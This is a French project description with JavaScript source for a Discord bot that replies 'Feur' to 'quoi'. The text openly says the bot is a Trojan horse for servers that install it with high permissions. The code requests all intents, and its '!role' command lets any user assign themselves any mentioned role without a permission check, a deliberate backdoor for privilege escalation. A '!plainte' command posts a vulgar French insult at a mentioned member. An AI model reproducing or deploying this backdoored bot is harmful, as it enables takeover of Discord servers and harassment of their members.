Projet 2: Bot Discord

C'est un bot Discord qui a pour principale fonction de répondre "feur" lorsque l'on écrit "quoi"

Mais il fait également office de cheval de Troie pour celui qui l'installe sur son serveur avec des droits trop élevés.

voisi le code:

const Discord = require('discord.js');

const intents = new Discord.Intents();

const regexEscape = require('regex-escape');

// Activer tous les intents

intents.add(Discord.Intents.ALL);

const client = new Discord.Client({ intents: intents });

client.on('message', message => {

// Convertit le message en minuscules

const lowerCaseMessage = message.content.toLowerCase();

if (message.content.toLowerCase().endsWith('quoi')) {

message.channel.send('Feur');

}

if (message.content.toLowerCase().endsWith('quoi?')) {

message.channel.send('Feur');

}

if (message.content.toLowerCase().endsWith('quoi ?')) {

message.channel.send('Feur');

}

});

client.on('message', message => {

// Si le message commence par "!plainte", on envoie un message au membre mentionné

if (message.content.startsWith('!plainte')) {

// Récupère le membre mentionné dans le message

const member = message.mentions.members.first();

// Récupère le salon textuel dans lequel envoyer la réponse

const channel = client.channels.cache.get('843803165244522519');

// Vérifie que le membre a été mentionné et que le salon textuel est valide

if (member && channel) {

// Envoie un message au membre mentionné dans le salon textuel

channel.send(`${member}, ${message.author} T'enmerde gros fils de pute`);

// Confirme l'envoi du message à l'utilisateur qui a fait la plainte

message.channel.send(`Le message de plainte a bien été envoyé à ${member} dans le salon ${channel}.`);

} else {

// Si aucun membre n'a été mentionné ou si le salon textuel est invalide, envoie un message d'erreur

message.channel.send(`Erreur : vous devez mentionner un membre du serveur et spécifier un salon textuel valide après la commande "!plainte".`);

}

}

});

client.on('message', message => {

// Si le message commence par "!role", on attribue le rôle mentionné au membre

if (message.content.startsWith('!role')) {

// Récupère le membre qui a envoyé le message

const member = message.member;

// Récupère le rôle mentionné dans le message

const role = message.mentions.roles.first();

// Vérifie que le rôle a été mentionné

if (role) {

// Attribue le rôle au membre

member.roles.add(role);

// Confirme l'attribution du rôle au membre

message.channel.send(`Le rôle ${role} a bien été attribué à ${member}.`);

} else {

// Si aucun rôle n'a été mentionné, envoie un message d'erreur

message.channel.send(`Vous devez mentionner un rôle après la commande "!role".`);

}

}

});
